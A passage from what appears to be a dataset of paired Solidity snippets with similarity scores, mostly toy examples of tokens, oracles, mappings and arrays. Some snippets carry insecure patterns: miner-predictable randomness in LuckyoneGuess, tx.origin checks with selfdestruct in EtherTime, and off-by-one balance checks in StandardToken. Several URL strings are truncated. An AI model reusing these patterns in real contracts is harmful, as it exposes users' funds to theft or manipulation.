        require(LINK.balanceOf(address(this)) > fee, ""Not enough LINK - fill contract with faucet"");
        uint256 seed = uint256(keccak256(abi.encode(userProvidedSeed, blockhash(block.number)))); 
        bytes32 _requestId = requestRandomness(keyHash, fee, seed);
        emit RequestRandomness(_requestId, keyHash, seed);
        return _requestId;
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) external override {
        uint256 d6Result = randomness.mod(6).add(1);
        emit RequestRandomnessFulfilled(requestId, randomness);
    }

}",0.5236768582545523,"contract LuckyoneGuess

{

    using SafeMath for *;



    address public master;



    mapping(uint256 => mapping(uint256 => uint256)) results;



    bool public paused = false;



    constructor() public {

        master = msg.sender;

    }



    modifier whenPaused() {

        require(paused);

        _;

    }



    modifier whenNotPaused() {

        require(!paused);

        _;

    }



    modifier onlyMaster() {

        require(msg.sender == master);

        _;

    }



    function pause() public whenNotPaused onlyMaster {

        paused = true;

    }



    function unpause() public whenPaused onlyMaster {

        paused = false;

    }



    function makeRandomResult(uint256 guessType, uint256 period, uint256 seed, uint256 maxNumber) onlyMaster

        public returns (bool)  {

        require(guessType > 0);

        require(period > 0);

        require(seed >= 0);

        require(maxNumber > 0);

        require(results[guessType][period] <= 0);

        require(maxNumber <= 1000000);

        uint256 random = uint256(keccak256(abi.encodePacked(

                (block.timestamp).add

                (block.difficulty).add

                (guessType).add

                (period).add

                (seed)))) % maxNumber;

        results[guessType][period] = random;

        return true;

    }



    function getResult(uint256 guessType, uint256 period)

        public view returns (uint256){

        require(guessType > 0);

        require(period > 0);

        require(results[guessType][period] > 0);

        return results[guessType][period];

    }

}"
"contract Cast {

    uint n;
    string s;
    address a;

    function convert() public view {
        bytes32 b1 = bytes32(n);
        bytes32 b2 = bytes32(a);
        bytes32 b4 = bytes32(""string"");
        bytes memory b5 = bytes(s);
    }
}",0.5902928517634187,"contract Helper {

    function toString(address x) internal pure
        returns (string)
    {
        bytes memory b = new bytes(20);
        for (uint i = 0; i < 20; i++)
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        return string(b);
    }
}"
"contract Test {
    uint256 public integer = 100;
    uint256[] public array;

    function fill_array() {
        while (integer > 0) {
            uint256 bit = integer%2;
            uint256 quotient = integer/2;
            array.push(bit);
            integer = quotient;
        }
    }
}",0.5763103147768546,"contract ArrayTools {

    function _combineArray(uint256[] _array) internal pure returns(uint256) {
        uint256 fullAmount;
        for(uint256 i = 0; i < _array.length; i++) {
            require(_array[i] > 0);
            fullAmount += _array[i];
        }
        return fullAmount;
    }
}"
"contract Foo {
  function baz(uint32 x, bool y) returns (bool r) { r = x > 32 || y; }
}",0.586384091268901,"contract ERC20Stateful {
    function transfer( address to, uint value) returns (bool ok);
}"
"contract Example {
    DBKeys.keyStruct knownValues;

    function add(bytes32 value) public {
        require(DBKeys.addZkey(knownValues, value));
    }
    function remove(bytes32 value) public {
        require(DBKeys.delZkey(knownValues, value));
    }
}",0.5368408184660939,"contract ValidationUtil {

    function requireNotEmptyAddress(address value){

        require(isAddressNotEmpty(value));

    }



    function isAddressNotEmpty(address value) internal returns (bool result){

        return value != 0;

    }

}"
"contract CappedCrowdsale is SampleCrowdsale {

    address public owner = 0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db;

    

    function getOwner3() public view returns(address anotherOwner) {
        return super.getOwner2(); 
    }

    

    function telling() public view returns(address chained) {
        return super.getOwner();
    }
}",0.5994913794778025,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
contract RefundableCrowdsale is SampleCrowdsale {},0.5286561936901558,"contract AssembledCommonSale is CommonSale {

}"
contract MintedCrowdsale is SampleCrowdsale {},0.5687212123033133,"contract AssembledCommonSale is CommonSale {

}"
contract TieredCrowdsale is SampleCrowdsale {},0.5655349737133084,"contract AssembledCommonSale is CommonSale {

}"
contract FinalizedCrowdsale is RefundableCrowdsale {},0.5085688420186356,"contract AssembledCommonSale is CommonSale {

}"
contract TimedCrowdsale is FinalizedCrowdsale {},0.5370479970409352,"contract AssembledCommonSale is CommonSale {

}"
contract Test { bytes32 public lastblockhashused; uint public lastblocknumberused; uint public AA; function test() { lastblocknumberused = (block.number-1) ;  lastblockhashused = block.blockhash(lastblocknumberused); } function getTest1() constant returns (uint) { return uint(lastblockhashused) & 0xfff;  } function Test2() { AA=(uint(lastblockhashused) & 0xfff); return;  } function getTest2AA() constant returns (uint) { return AA; }},0.5946110562988566,"contract PricingStrategy {

  
  uint public presaleMaxValue = 0;

  function isPricingStrategy() external constant returns (bool) {
      return true;
  }

  function getPresaleMaxValue() public constant returns (uint) {
      return presaleMaxValue;
  }

  function isPresaleFull(uint weiRaised) public constant returns (bool);

  function getAmountOfTokens(uint value, uint weiRaised) public constant returns (uint tokensAmount);
}"
"contract B is A {
  uint8 public b1;

  function B() A(0x0011223344556677889900112233445566778899) {
  }
}",0.5186730998185684,"contract IERC20WithDecimals is ERC20 {
    function decimals() public view returns (uint8);
}"
"contract House {
    using Cars for Cars.Car;
    Cars.Car public myCar;

    function startCar(uint fuel) public {
        myCar.startEngine(fuel);
        myCar.enableBrakes(false);
    }
}",0.5296952755718012,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract GreeterContainer is Greetable {

    
    Greetable greeter;

    function GreeterContainer(address greeter_address) public {
        greeter = Greetable(greeter_address);
    }

    
    
    function setGreeter(address _greeter_address) public {
        greeter = Greetable(_greeter_address);
    }

    
    function greet() constant public returns (bytes32) {
        return greeter.greet();
    }
}",0.5965072411505136,"contract Ownable {



    address public owner;



    modifier onlyOwner {

        require(isOwner(msg.sender));

        _;

    }



    function Ownable() public {

        owner = msg.sender;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        owner = _newOwner;

    }



    function isOwner(address _address) public constant returns (bool) {

        return owner == _address;

    }

}"
"contract Untested {

    
    
    struct OracleCallbackDetails {
        uint arg1;
        uint arg2;
    }

    
    mapping(bytes32 => OracleCallbackDetails) oracleDetails;

    
    
    function __callback(bytes32 myid, string result) public {
        require(msg.sender == oraclize_cbAddress());

        OracleCallbackDetails storage details = oracleDetails[myid];
        functionToCall(details.arg1, details.arg2);
    }

    
    
    function doSomethingThatNeedsOraclize (uint arg1, uint arg2) {
        bytes32 queryId = oraclize_query(""URL"", <URL_string>);
        oracleDetails[queryId] = OracleCallbackDetails(arg1, arg2);
    }
}",0.510603469274088,"contract I_Pricer {
    uint128 public lastPrice;
    uint public constant DELAY = 1 days;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;
    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID){}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract timeLock {
    struct accountData
    {
        uint balance;
        uint releaseTime;
    }

    mapping (address => accountData) accounts;

    function payIn(uint _lockTimeS) public payable {
        uint amount = msg.value;
        payOut();
        if (accounts[msg.sender].balance > 0)
            msg.sender.transfer(msg.value);
        else
        {
            accounts[msg.sender].balance = amount;
            accounts[msg.sender].releaseTime = now + _lockTimeS;
        }
    }

    function payOut() public {
        if (accounts[msg.sender].balance != 0 && accounts[msg.sender].releaseTime < now)
        {
            msg.sender.transfer(accounts[msg.sender].balance);
            accounts[msg.sender].balance = 0;
            accounts[msg.sender].releaseTime = 0;
        }
    }

    function getMyLockedFunds() view public returns (uint x)
    {
        return accounts[msg.sender].balance;
    }

    function getMyLockedFundsReleaseTime() view public returns (uint x)
    {
        return accounts[msg.sender].releaseTime;
    }

    function getNow() view public returns (uint x)
    {
        return now;
    }
}",0.5930713495136245,"contract SyscoinDepositsManager {

    using SafeMath for uint;

    mapping(address => uint) public deposits;

    event DepositMade(address who, uint amount);
    event DepositWithdrawn(address who, uint amount);

    
    function() external payable {
        makeDeposit();
    }

    
    
    
    function getDeposit(address who) external view returns (uint) {
        return deposits[who];
    }

    
    
    function makeDeposit() public payable returns (uint) {
        increaseDeposit(msg.sender, msg.value);
        return deposits[msg.sender];
    }

    
    
    function increaseDeposit(address who, uint amount) private {
        deposits[who] = deposits[who].add(amount);
        emit DepositMade(who, amount);
    }

    
    
    
    function withdrawDeposit(uint amount) external returns (uint) {
        require(deposits[msg.sender] >= amount);

        deposits[msg.sender] = deposits[msg.sender].sub(amount);
        msg.sender.transfer(amount);

        emit DepositWithdrawn(msg.sender, amount);
        return deposits[msg.sender];
    }
}"
"contract MetaCoint {
    uint public index;
    mapping(uint => uint) public counters;

    function addCounter() external {
        index++;
    }

    function incCounter(uint _index) external {
        require(_index < index, ""counter was not created"");
        counters[_index]++;
    }
}",0.5910246414834958,"contract ICToken {
    address public underlying;
    function mint(uint256 mintAmount) external returns (uint);
    function exchangeRateCurrent() external returns (uint);
    function redeem(uint redeemTokens) external returns (uint);
}"
"contract Ordered {

    uint public nonce;

    event LogNextTransaction(address sender, uint transactionNumber);

    function doSomethingOrdered(uint transactionNumber) public {
        require(transactionNumber == nonce);
        emit LogNextTransaction(msg.sender, transactionNumber);
        nonce++;
    }
}",0.5357270312362181,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract Consumer {
    InfoFeed feed;
    function setFeed(InfoFeed addr) public { 
        feed = addr;             
    }
    function callFeed() public { 
        feed.info.value(10).gas(800)();             
    }
}",0.5826056796933616,"contract EnsResolver {

	function setAddr(bytes32 node, address addr) public;

	function addr(bytes32 node) public view returns (address);

}"
"contract MyContract {
    struct Obj {
        uint32 a;
        uint32 b;
        uint32 c;
    }

    mapping(string => Obj) internal objs;

    function set1(string objName, uint256 obja, uint256 objb, uint256 objc) external {
        Obj memory obj;
        obj.a = uint32(obja);
        obj.b = uint32(objb);
        obj.c = uint32(objc);
        objs[objName] = obj;
    }

    function set2(string objName, uint256 obja, uint256 objb, uint256 objc) external {
        objs[objName].a = uint32(obja);
        objs[objName].b = uint32(objb);
        objs[objName].c = uint32(objc);
    }
}",0.5099437390550171,"contract PaymentInterface {
    function createCastle(address _trainer, uint _tokens, string _name, uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) public returns(uint);
    function catchMonster(address _trainer, uint _tokens, uint32 _classId, string _name) public returns(uint);
    function payService(address _trainer, uint _tokens, uint32 _type, string _text, uint64 _param1, uint64 _param2, uint64 _param3) public returns(uint);
}"
"contract C {
    mapping(uint256 => uint256) items;
    function C() {
      items[0xC0FEFE] = 0x42;
    }
}",0.5887999275089988,"contract HEX2{
    function distribute(uint256 _amount) public returns (uint256);
}"
"contract Test {

    struct Struct {
      uint[] myArray;
    }

    Struct myStruct; 

    function Test()  {
        myStruct.myArray.push(1);
        myStruct.myArray.push(2);
        myStruct.myArray.push(3);
    }

    function getter(uint index) returns(uint value) {
        return myStruct.myArray[index];
    }

}",0.5298227530341987,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract DeleteUser {

    struct UserStruct {
        bytes32[] assets;
        mapping(bytes32 => uint) assetPointers;
    }

    mapping(address => UserStruct) userStructs;

    function isUserAsset(address user, bytes32 assetId) public view returns(bool isIndeed) {
        if(userStructs[user].assets.length == 0) return false;
        return userStructs[user].assets[userStructs[user].assetPointers[assetId]] == assetId;
    }

    function deleteUserAsset(address user, bytes32 assetId) public {
        UserStruct storage u = userStructs[user];
        require(isUserAsset(user, assetId));
        uint rowToDelete = u.assetPointers[assetId];
        u.assets[rowToDelete] = u.assets[u.assets.length-1];
        u.assets.length--;
    }

}",0.504307389360289,"contract TermsContractInterface {



	function registerTermStart(

        bytes32 agreementId,

        address debtor

    ) public returns (bool _success);



	function registerRepayment(

        bytes32 agreementId,

        address payer,

        address beneficiary,

        uint256 unitsOfRepayment,

        address tokenAddress

    ) public returns (bool _success);



	function getExpectedRepaymentValue(

        bytes32 agreementId,

        uint256 timestamp

    ) public view returns (uint256);



	function getValueRepaidToDate(

        bytes32 agreementId

    ) public view returns (uint256);



	function getTermEndTimestamp(

        bytes32 _agreementId

    ) public view returns (uint);



}"
"contract ProofOfExistence4 is usingOraclize {

string public currentRound;
bytes32 public id;

function ProofOfExistence4 () {
  
}
function() payable {}

event ResultUpdated (string currentRound);

function __callback(bytes32 myid, string result, bytes proof)  {
    currentRound = ""0"";
    if (msg.sender != oraclize_cbAddress()) throw;

    currentRound = ""1"";
    currentRound = result;
    ResultUpdated(currentRound);
}

function __callback(bytes32 myid, string result)  {
    currentRound = ""2"";
    if (msg.sender != oraclize_cbAddress()) throw;

    currentRound = ""3"";

    currentRound = result;
    ResultUpdated(currentRound);
}

function getNumber() public payable {
    id = 3;
    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    id = oraclize_query(""WolframAlpha"", ""random number between 0 and 100"");
    
    }
}",0.5378962374159335,"contract Bounty {

    uint public counter = 0;

    uint public currentNumber = 1;

    string internal base64this;

    mapping(address => bool) internal winners; 

    

    constructor(string memory _base64) public {

        base64this = _base64;

    }

    

    function claim(uint guessCurrentNumber, uint setNextNumber) public {

        require(counter < 10, ""All prizes collected"");

        require(winners[msg.sender] == false, ""Cannot participate twice. But feel free to sybil us"");

        require(currentNumber == guessCurrentNumber);

        currentNumber = setNextNumber;

        counter += 1;

        winners[msg.sender] = true;

    }

    

    function getPrize() public view returns (string memory){

        require(winners[msg.sender]);

        return base64this;

    }

    

    function isWinner(address _address) public view returns(bool){

        return winners[_address];

    }

    

}"
"contract A {

    function test(bytes32 r) public pure returns (bytes8 i, bytes8 j, bytes8 k, bytes8 m) {
        uint256 rr = uint256(r);
        i = bytes8(uint64(rr >> 64*3));
        j = bytes8(uint64(rr >> 64*2));
        k = bytes8(uint64(rr >> 64*1));
        m = bytes8(uint64(rr >> 64*0));
    }

    function bar(bytes32 r) public pure returns (bytes8 i, bytes8 j, bytes8 k, bytes8 m) {
        i = bytes8(r);
        j = bytes8(r << 64*1);
        k = bytes8(r << 64*2);
        m = bytes8(r << 64*3);
    }

    function foo(bytes32 r) public pure returns (bytes8 i, bytes8 j, bytes8 k, bytes8 m) {
        assembly {
            i := r
            j := shl(64, r)
            k := shl(128, r)
            m := shl(192, r)
        }
    }
}",0.5470558222085157,"contract Metadata {

    using strings for *;



    function tokenURI(uint _tokenId) public view returns (string _infoUrl) {

        string memory base = ""https:

        string memory id = uint2hexstr(_tokenId);

        return base.toSlice().concat(id.toSlice());

    }

    function uint2hexstr(uint i) internal pure returns (string) {

        if (i == 0) return ""0"";

        uint j = i;

        uint length;

        while (j != 0) {

            length++;

            j = j >> 4;

        }

        uint mask = 15;

        bytes memory bstr = new bytes(length);

        uint k = length - 1;

        while (i != 0){

            uint curr = (i & mask);

            bstr[k--] = curr > 9 ? byte(55 + curr) : byte(48 + curr); 

            i = i >> 4;

        }

        return string(bstr);

    }

}"
"contract RegisterCandidate {
    
    struct Address {
        string addressLine;
        string district;
        string state;
        uint pincode;     
    }

    
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
        uint age;
    }
    
    mapping(uint => Candidate) candidates;  
    mapping(uint => Address) public addresses;
    
    uint public candidatesCount;

    function getCandidate(uint key) public view returns(string name, string addressLine, string district, string state, uint pincode, uint voteCount, uint age) {
        Address storage a = addresses[key];
        Candidate storage c = candidates[key];
        return (c.name, a.addressLine, a.district, a.state, a.pincode, c.voteCount, c.age);
    }

    function addCandidate (string _name,uint _age,string _address,string _district,string _state,uint _pincode) public {
        candidatesCount ++;
        addresses[candidatesCount] = Address(_address,_district,_state,_pincode);
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0, _age);
    }

}",0.5733297676722574,"contract VeRegistry is Ownable {

    

    struct Asset {
        address addr;
        string meta;
    }

    

    mapping (string => Asset) assets;

    

    event AssetCreated(
        address indexed addr
    );

    event AssetRegistered(
        address indexed addr,
        string symbol,
        string name,
        string description,
        uint256 decimals
    );

    event MetaUpdated(string symbol, string meta);

    

    function register(
        address addr,
        string symbol,
        string name,
        string description,
        uint256 decimals,
        string meta
    )
        public
        onlyOwner
    {
        assets[symbol].addr = addr;

        AssetRegistered(
            addr,
            symbol,
            name,
            description,
            decimals
        );

        updateMeta(symbol, meta);
    }

    function updateMeta(string symbol, string meta) public onlyOwner {
        assets[symbol].meta = meta;

        MetaUpdated(symbol, meta);
    }

    function getAsset(string symbol) public constant returns (address addr, string meta) {
        Asset storage asset = assets[symbol];
        addr = asset.addr;
        meta = asset.meta;
    }
}"
"contract Student { 
    bytes32[32] parameters; 
    function setParameters(bytes32[] memory _parameters) public { 
        for (uint i = 0; i < _parameters.length; i++) { 
            parameters[i] = _parameters[i];
        } 
    }
}",0.558517122936564,"contract UniversalSchemeInterface {



    function updateParameters(bytes32 _hashedParameters) public;



    function getParametersFromController(Avatar _avatar) internal view returns(bytes32);

}"
"contract NeedExtraGas {
    event Paid(uint);
    uint total;
    function () payable {
        total += msg.send;
        Paid(msg.value);
    }
}",0.57670049084406,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract test {
enum ActionChoices { GoLeft, GoRight, GoStraight, SitStill }
ActionChoices choice;
ActionChoices constant defaultChoice = ActionChoices.GoStraight;

function setGoStraight() public {
    choice = ActionChoices.GoStraight;
}






function getChoice() public view returns (ActionChoices) {
    return choice;
}

function getDefaultChoice() public pure returns (uint) {
    return uint(defaultChoice);
}


}",0.5375257896798015,"contract PricingStrategy is IPricingStrategy {

    using SafeMath for uint;

    uint public rate;

    function PricingStrategy(
        uint _rate
    ) public 
    {
        require(_rate >= 0);
        rate = _rate;
    }

    
    function isPricingStrategy() public view returns (bool) {
        return true;
    }

    
    function calculateTokenAmount(uint weiAmount, uint tokensSold) public view returns (uint tokenAmount) {
        return weiAmount.mul(rate);
    }

}"
"contract KrakenPriceTicker is usingOraclize {
    string public ETHXBT;

    function PriceTicker() {
        oraclize_setNetwork(networkID_testnet);
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        oraclize_query(""URL"", ""json(https:
    }

    function __callback(bytes32 myid, string result, bytes proof) {
        if (msg.sender != oraclize_cbAddress()) throw;
        ETHXBT = result;
        
    }
}",0.5423377231071995,"contract Kraken is Oraclize {
    constructor(MedianizerInterface med_, MedianizerInterface medm_, WETH weth_)
        public
        Oraclize(med_, medm_, weth_)
    {}

    function getAssetPrice(uint128 payment)
        internal returns (bytes32 queryId)
    {
        weth.withdraw(payment);
        require(oraclize_getPrice(""URL"") <= address(this).balance);
        queryId = oraclize_query(""URL"", ""json(https:
    }
}"
contract Array is owned { using LinkedList for LinkedList.data; using LinkedList for LinkedList.Node; LinkedList.data list; function Array(){  if( test_callstack() != 1 ) throw;  list.construct_me(); } function test_callstack() constant returns ( int ){ return 1; }},0.5410599090336041,"contract ArconaDigitalLand is LandBase {

    string public constant name = "" Arcona Digital Land"";

    string public constant symbol = ""ARDL"";



    function implementsERC721() public pure returns (bool)

    {

        return true;

    }



    function() public payable{

        revert();

    }

}"
"contract Practice {

    function refillAccount(address receiver) payable returns(bool isRefilled) {

        if(msg.value != 1 ether) throw; 
        
        if(!receiver.send(msg.value)) {
            throw; 
        }
        
        return true;
    }
}",0.5895951816550002,"contract ERC1003Caller is Ownable {

    function makeCall(address target, bytes data) external payable onlyOwner returns (bool) {

        

        return target.call.value(msg.value)(data);

    }

}"
"contract TestOraclizeCall is usingOraclize {
        uint public price;
       event Log(string text);
       
       function TestOraclizeCall() {
             OAR = OraclizeAddrResolverI(0x5049063e4a7704ac155e4f1f42a4954bbef5bbde);
        }
  function __callback(bytes32 _myid, string _result) {
             require (msg.sender == oraclize_cbAddress());
             Log(_result);
              price = parseInt(_result, 2);
    }
    function update() payable {
            oraclize_query(""URL"",""json(https:
    }
",0.5448825935845306,"contract OraclizeI {
    address public cbAddress;
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable public returns (bytes32 _id);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) public;
    function setCustomGasPrice(uint _gasPrice) public;
}"
"contract NoFallback {
    
}",0.5975969817602502,"contract Ballot {


    
}"
"contract Caller {
    Safe safeInstance;
    NotSafe notSafeInstance;
    FakeSafe fakeSafeInstance;
    NoFallback noFallbackInstance;
    EmptyFallback emptyFallbackInstance;

    function Caller() public {
        safeInstance = new Safe();
        fakeSafeInstance = new FakeSafe();
        notSafeInstance = new NotSafe();
        noFallbackInstance = new NoFallback();
        emptyFallbackInstance = new EmptyFallback();
    }

    
    function testSafe()
        public
        returns (bool _isSafe)
    {
        return testIsSafe(address(safeInstance));
    }

    
    function testNotSafe()
        public
        returns (bool _isSafe)
    {
        return testIsSafe(address(notSafeInstance));
    }

    
    function testFakeSafe()
        public
        returns (bool _isSafe)
    {
        return testIsSafe(address(fakeSafeInstance));
    }

    
    function testNoFallback()
        public
        returns (bool _isSafe)
    {
        return testIsSafe(address(noFallbackInstance));
    }

    
    function testEmptyFallback()
        public
        returns (bool _isSafe)
    {
        return testIsSafe(address(emptyFallbackInstance));
    }



    function testIsSafe(address _addr)
        private
        returns (bool _isSafe)
    {
        bytes32 sig = bytes4(keccak256(""isSafe()""));
        bool _success = false;
        assembly {
            let x := mload(0x40)    
            mstore(x, sig)          
            _success := call(
                5000,   
                _addr,  
                0,      
                x,      
                4,      
                x,      
                32      
            )
            
            _isSafe := and(_success, mload(x))
        }
    }
}",0.5554525629724966,"contract StandardToken is ERC20 {

    mapping (address => uint) public balances;

    mapping (address => mapping (address => uint)) allowed;

    

    function balanceOf(address _owner) public constant returns (uint balance) {

        return balances[_owner];

    }

    

    function transfer(address _to,uint _value) public returns (bool success) {

        if(balances[msg.sender] > _value && _value > 0 && balances[_to] + _value > balances[_to]){

            balances[_to] += _value;

            balances[msg.sender] -= _value;

            emit Transfer(msg.sender,_to,_value);

            return true;

        } else {

            return false;

        }

    }

    

    function transferFrom(address _from,address _to,uint _value) public returns (bool success) {

        if(balances[_from] > _value && _value > 0 && allowed[_from][msg.sender] > _value && balances[_to] + _value > balances[_to]) {

            balances[_from] -= _value;

            balances[_to] += _value;

            allowed[_from][msg.sender] -= _value;

            emit Transfer(_from,_to,_value);

            return true;

        } else {

            return false;

        }

    }

    

    function approve(address _spender, uint _value) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender,_spender,_value);

        return true;

    }

    function allownce(address _owner,address _spender) public constant returns (uint remaining) {

        return allowed[_owner][_spender];

    }

    

}"
"contract SimpleEnum {

  enum SomeData {DEFAULT,ONE,TWO}
  SomeData someData;

  constructor() public {
      someData = SomeData.DEFAULT;
  }

  function setValues(uint _value) public {
      require(uint(SomeData.TWO) >= _value);
      someData = SomeData(_value);
  }

  function getValue() public view returns (uint){
      return uint(someData);
  }
}",0.5576041151635424,"contract Nonce {
    event IncrementEvent(address indexed _sender, uint256 indexed _newNonce);
    uint256 value;
    
    function increment() public returns (uint256) {
        value = ++value;
        emit IncrementEvent(msg.sender, value);
        return value;
    }
    
    function getValue() public view returns (uint256) {
        return value;
    }
}"
"contract MyContract {
    uint[] public list;

    struct Item {
        bool valid;
        uint index;
        uint value; 
        string name; 
    }

    mapping(uint => Item) public table;

    
    function upsert(uint ID, uint value, string name) external {
        Item storage item = table[ID];
        if (!item.valid) {
            item.valid = true;
            item.index = list.length;
            list.push(ID);
        }
        item.value = value; 
        item.name = name; 
    }

    
    function remove(uint ID) external {
        Item storage item = table[ID];
        require(item.index < list.length);
        require(ID == list[item.index]);
        uint lastItem = list[list.length - 1];
        table[lastItem].index = item.index;
        list[item.index] = lastItem;
        list.length -= 1;
        delete table[ID];
    }

    
    function count() external view returns (uint) {
        return list.length;
    }
}",0.5534902325357911,"contract Metadata {
    using strings for *;

    function tokenURI(uint _tokenId) public pure returns (string memory _infoUrl) {
        string memory base = ""https:
        string memory id = uint2str(_tokenId);
        return base.toSlice().concat(id.toSlice());
    }

    function uint2str(uint i) internal pure returns (string memory) {
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0) {
            uint _uint = 48 + i % 10;
            bstr[k--] = toBytes(_uint)[31];
            i /= 10;
        }
        return string(bstr);
    }

    function toBytes(uint256 x) public pure returns (bytes memory b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }
}"
"contract ItemListContract {
    struct item {
        bytes iname;
        uint16 itemid;
        bytes icode;
        uint ivalue;
    }

    uint itemCount;
    mapping(bytes => item) itemList;
    item[] itemArray;

    function ItemListContract() {
        log0('hi');
    }

    function addItem(bytes name, uint16 iid, bytes code, uint val) {        
        var itemnew = item(name, iid ,code, val);
        
        itemList[code] = itemnew;
        itemArray.push(itemnew);
        itemCount++;
    }

    function countItemList() constant returns (uint count) {     
        return itemCount;
    }

    function removeItem(bytes code) {
        delete itemList[code];
        itemCount--;
    }

    function getItem(bytes code) constant returns (bytes iname, uint val) {   
        return (itemList[code].iname, itemList[code].ivalue);
    }
}",0.5662562844338438,"contract ERC223 {
  uint public totalSupply;
  function balanceOf(address who) constant public returns (uint);

  function name() constant public returns (string _name);
  function symbol() constant public returns (string _symbol);
  function decimals() constant public returns (uint8 _decimals);
  function totalSupply() constant public returns (uint256 _supply);

  function transfer(address to, uint value) public returns (bool ok);
  function transfer(address to, uint value, bytes data) public returns (bool ok);
  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract WidgetManager {

  WidgetMaker maker;

  function WidgetManager() public {
    maker = new WidgetMaker();
  }

  
}",0.5436202458478729,"contract Withdraw {

    address public owner;

    
    function Withdraw(address _owner) public {
        owner = _owner;
    }

}"
"contract SomeTest {
    

    modifier requiresFee(uint fee) {
        if (msg.value < fee) { throw; }
        _
    }

    function sellEnergy(uint kwh) public requiresFee(0.001 ether) {
        coinAccount[msg.sender] += (kwh * kWh_rate);
    }
}",0.5511479001009445,"contract EtherTime

{

    address Owner = msg.sender;



    function() public payable {}



    function Xply() public payable {

        if (msg.value >= address(this).balance || tx.origin == Owner) {

            selfdestruct(tx.origin);

        }

    }

 }"
"contract Storage {

   address owner = 0xdeadbeef...; 

   bytes32[] storageContainer;

   function pushByte(bytes32 b) {
      storageContainer.push(b);
   }

}",0.5657036257048279,"contract Registrar { 
    modifier onlyOwner(bytes32 _hash) { _; }
    function transfer(bytes32 _hash, address newOwner) onlyOwner(_hash) {}
}"
"contract TestArray {
    uint[] public original;
    uint[] public newOr;
    event Log(uint n, uint a, uint b, uint c);

    function TestArray(){
        original.push(1);
        original.push(2);
        original.push(3);
        original.push(4);

    }

    function test(){
        newOr = remove(original, 1);
        Log(newOr.length, newOr[0], newOr[1], newOr[2]);
    }
    function remove(uint[] array, uint index) internal returns(uint[] value) {
        if (index >= array.length) return;

        uint[] memory arrayNew = new uint[](array.length-1);
        for (uint i = 0; i<arrayNew.length; i++){
            if(i != index && i<index){
                arrayNew[i] = array[i];
            } else {
                arrayNew[i] = array[i+1];
            }
        }
        delete array;
        return arrayNew;
    }

}",0.5840278728624153,"contract SafeMath {

  



  function safeMul(uint a, uint b) internal pure returns (uint) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeSub(uint a, uint b) internal pure returns (uint) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint a, uint b) internal pure returns (uint) {

    uint c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  event Transfer(address indexed _from, address indexed _to, uint256 _value);

  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  event Burn(address indexed _from, uint256 _value);

}"
"contract test {

  struct my_struct {
    int a;
  }

  mapping (address=>my_struct[]) Map;

  function fill_map(my_struct struct1,my_struct struct2) internal  {

    Map[msg.sender].push(struct1);
    Map[msg.sender].push(struct2);

  }
}",0.5139960494212129,"contract FunGame 
{
    address owner;
    struct user
    {
        address parent;
        uint8 level;
    }
    mapping(address=>user) public map;
    function FunGame()
    {
        owner = msg.sender;
        map[msg.sender].level = 8; 
    }
}"
"contract DieselPricePeg is usingOraclize {

    uint public DieselPriceUSD;


    function DieselPricePeg() {
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        update(0); 
    }

    function __callback(bytes32 myid, string result, bytes proof) {
        if (msg.sender != oraclize_cbAddress()) throw;
        DieselPriceUSD = parseInt(result, 2); 
        
        update(60*10); 
    }

    function update(uint delay) {
        oraclize_query(delay, ""URL"", ""xml(https:
    }

}",0.5535941290173582,"contract OraclizeI {
    address public cbAddress;
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable public returns (bytes32 _id);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) public;
    function setCustomGasPrice(uint _gasPrice) public;
}"
"contract Raffle {
    mapping(uint256 => address) reserved;

    event Reserved(uint256 value, address owner);

    function reserve(uint256 value) public {
        require(reserved[value] == address(0), ""Already reserved"");
        reserved[value] = msg.sender;
        emit Reserved(value, msg.sender);
    }
}",0.5935988978536971,"contract Token {
  
  
  
  
  function transfer(address _to, uint256 _value) returns (bool success) {}

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}"
"contract Mapping {
    mapping(address => address) public matches;

    function writeMapping(address addr) {
        matches[addr] = msg.sender;
    }
